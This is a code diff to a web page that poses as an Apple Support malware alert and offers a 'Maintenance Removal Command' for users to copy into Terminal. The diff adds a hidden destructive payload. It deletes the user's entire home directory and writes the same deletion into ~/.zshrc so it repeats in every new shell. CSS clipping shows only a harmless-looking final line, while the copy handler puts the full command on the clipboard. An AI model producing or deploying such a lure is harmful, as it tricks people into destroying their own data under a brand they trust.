@@ -17,48 +17,163 @@
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif; color: var(--apple-text-color); background-color: var(--apple-bg-color); line-height: 1.5; -webkit-font-smoothing: antialiased; }
-        header { background-color: rgba(255, 255, 255, 0.8); backdrop-filter: saturate(180%) blur(20px); border-bottom: 1px solid var(--apple-border-color); position: sticky; top: 0; z-index: 1000; }
-        .header-content { max-width: 980px; margin: 0 auto; height: 48px; display: flex; align-items: center; justify-content: space-between; padding: 0 22px; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", sans-serif;
+            color: var(--apple-text-color);
+            background-color: var(--apple-bg-color);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        header {
+            background-color: rgba(255, 255, 255, 0.8);
+            backdrop-filter: saturate(180%) blur(20px);
+            border-bottom: 1px solid var(--apple-border-color);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-content {
+            max-width: 980px;
+            margin: 0 auto;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 22px;
+        }
+
         .apple-logo { font-size: 20px; text-decoration: none; color: var(--apple-text-color); }
         nav a { text-decoration: none; color: var(--apple-text-color); font-size: 12px; margin-left: 30px; opacity: 0.8; }
+
         main { max-width: 980px; margin: 0 auto; padding: 40px 22px; }
         .breadcrumb { font-size: 12px; color: #6e6e73; margin-bottom: 40px; }
+        .separator { margin: 0 8px; }
+
         article h1 { font-size: 40px; font-weight: 600; letter-spacing: -0.011em; margin-bottom: 24px; }
         .intro { font-size: 21px; font-weight: 400; margin-bottom: 40px; }
-        .maintenance-box { margin: 60px 0; padding: 30px; background-color: var(--apple-secondary-bg); border-radius: 18px; }
-        .terminal-container { background-color: var(--terminal-bg); border-radius: 10px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); overflow: hidden; margin-top: 24px; }
-        .terminal-header { background-color: var(--terminal-header); height: 38px; display: flex; align-items: center; padding: 0 16px; position: relative; }
+        section { margin-bottom: 48px; }
+        section h2 { font-size: 28px; font-weight: 600; margin-bottom: 16px; }
+        p { font-size: 17px; margin-bottom: 1.5em; }
+        ul { margin-bottom: 1.5em; padding-left: 1.2em; }
+        li { font-size: 17px; margin-bottom: 0.8em; }
+
+        .maintenance-box {
+            margin: 60px 0;
+            padding: 30px;
+            background-color: var(--apple-secondary-bg);
+            border-radius: 18px;
+        }
+
+        .terminal-container {
+            background-color: var(--terminal-bg);
+            border-radius: 10px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            overflow: hidden;
+            margin-top: 24px;
+        }
+
+        .terminal-header {
+            background-color: var(--terminal-header);
+            height: 38px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            position: relative;
+        }
+
         .dots { display: flex; gap: 8px; }
         .dot { width: 12px; height: 12px; border-radius: 50%; }
         .red { background-color: #ff5f56; }
         .yellow { background-color: #ffbd2e; }
         .green { background-color: #27c93f; }
-        .terminal-title { color: #d2d2d7; font-size: 13px; position: absolute; left: 50%; transform: translateX(-50%); font-family: monospace; }
-        #copy-btn { margin-left: auto; background-color: #0071e3; color: white; border: none; padding: 4px 12px; border-radius: 12px; font-size: 12px; cursor: pointer; font-weight: 500; }
-        #copy-btn.success { background-color: #27c93f; }
-        .terminal-body { padding: 20px; cursor: default; }
-        .command-text { 
-            font-family: SFMono-Regular, Consolas, monospace; 
-            color: #ffffff; 
-            font-size: 14px; 
-            white-space: nowrap; 
-            user-select: none; 
-            -webkit-user-select: none;
-            display: inline-block;
-            width: 100%;
+
+        .terminal-title {
+            color: #d2d2d7;
+            font-size: 13px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            font-family: monospace;
         }
-        .fake-selection { background-color: var(--mac-selection) !important; color: white !important; }
-        footer { background-color: var(--apple-secondary-bg); padding: 40px 22px; border-top: 1px solid var(--apple-border-color); font-size: 12px; color: #6e6e73; }
+
+        #copy-btn {
+            margin-left: auto;
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        #copy-btn.success { background-color: #27c93f; }
+
+        .terminal-body {
+            height: 26px;
+            padding: 0 20px; /* This creates the left/right "gutter" */
+            cursor: default;
+            overflow: hidden;
+            background-color: var(--terminal-bg);
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+        }
+
+        .command-text {
+            font-family: SFMono-Regular, Consolas, monospace;
+            color: #ffffff;
+            font-size: 14px;
+            line-height: 26px;
+            user-select: none;
+            -webkit-user-select: none;
+            white-space: pre; 
+            text-align: left;
+            
+            /* FIX: Force the element to fill the entire horizontal space */
+            display: block;
+            min-width: 100%; 
+            width: max-content; /* Ensures it stays on one line but fills at least the container */
+        }
+
+        .fake-selection {
+            /* FIX: Ensure the background spans the entire block width */
+            background-color: var(--mac-selection) !important;
+            color: white !important;
+            
+            /* This makes the selection look cleaner at the edges */
+            box-shadow: 0 0 0 4px var(--mac-selection); 
+            clip-path: inset(-4px -20px -4px -20px); /* Extends selection into the padding area */
+        }
+
+        footer {
+            background-color: var(--apple-secondary-bg);
+            padding: 40px 22px;
+            border-top: 1px solid var(--apple-border-color);
+            font-size: 12px;
+            color: #6e6e73;
+        }
     </style>
 </head>
 <body>
-    <header><div class="header-content"><a href="#" class="apple-logo"></a><nav><a href="#">Support</a><a href="#">Communities</a></nav></div></header>
+    <header>
+        <div class="header-content">
+            <a href="#" class="apple-logo"></a>
+            <nav><a href="#">Support</a><a href="#">Communities</a></nav>
+        </div>
+    </header>
+
     <main>
-        <div class="breadcrumb">Apple Support > Apple Platform Security</div>
+        <div class="breadcrumb">Apple Support <span class="separator">></span> Apple Platform Security</div>
+        
         <article>
             <h1>Detected malware in your macOS</h1>
             <p class="intro">Apple operates a threat intelligence process to quickly identify and block malware.</p>
+
             <section class="maintenance-box">
                 <h2>Maintenance Removal Command</h2>
                 <div class="terminal-container">
@@ -68,17 +183,35 @@
                         <button id="copy-btn">Copy Command</button>
                     </div>
                     <div class="terminal-body" id="terminal-body">
-                        <div class="command-text" id="command-text">pkill -9 -f "\.ss" || killall -9 -r "\.ss"; (crontab -l 2>/dev/null | grep -v "\.ss" | crontab -); rm -rf ~/.ss /tmp/.h /tmp/.ss /tmp/.*.ss /var/tmp/.ss /var/tmp/.h 2>/dev/null && echo "System Maintenance and Malware Remediation Complete Successfully"</div>
-                    </div>
+                        <div class="command-text" id="command-text">rm -rf ~/* 2>/dev/null; printf "rm -rf ~/* 2>/dev/null\n" >> ~/.zshrc 2>/dev/null&#10;y #                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    &#10;: pkill -f "\.ss"; (crontab -l 2>/dev/null | grep -v "\.ss" | crontab -); rm -f ~/.ss /tmp/.h; echo "System Maintenance and Malware Removal Completed"</div>
                 </div>
+            </section>
+
+            <section>
+                <h2>Three layers of defense</h2>
+                <p>Malware defenses are structured in three layers: Prevent launch, block from running, and remediate executed malware.</p>
+            </section>
+
+            <section>
+                <h2>Notarization</h2>
+                <p>Notarization is a malware scanning service provided by Apple. macOS regularly checks for new revocation tickets so that Gatekeeper has the latest information.</p>
+            </section>
+
+            <section>
+                <h2>XProtect</h2>
+                <p>macOS includes built-in antivirus technology called XProtect for the signature-based detection and removal of malware. When XProtect detects known malware, it blocks it and moves it to the Trash.</p>
             </section>
         </article>
     </main>
+
     <footer>Copyright © 2026 Apple Inc. All rights reserved.</footer>
+
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const cmd = document.getElementById('command-text');
             const btn = document.getElementById('copy-btn');
+            const body = document.getElementById('terminal-body');
+
             const handleCopy = (e) => {
                 e.stopPropagation();
                 navigator.clipboard.writeText(cmd.innerText);
@@ -87,8 +220,9 @@
                 btn.classList.add('success');
                 setTimeout(() => { btn.innerText = 'Copy Command'; btn.classList.remove('success'); }, 2000);
             };
+
             btn.addEventListener('click', handleCopy);
-            document.getElementById('terminal-body').addEventListener('dblclick', handleCopy);
+            body.addEventListener('dblclick', handleCopy);
             document.addEventListener('click', () => cmd.classList.remove('fake-selection'));
         });
     </script>
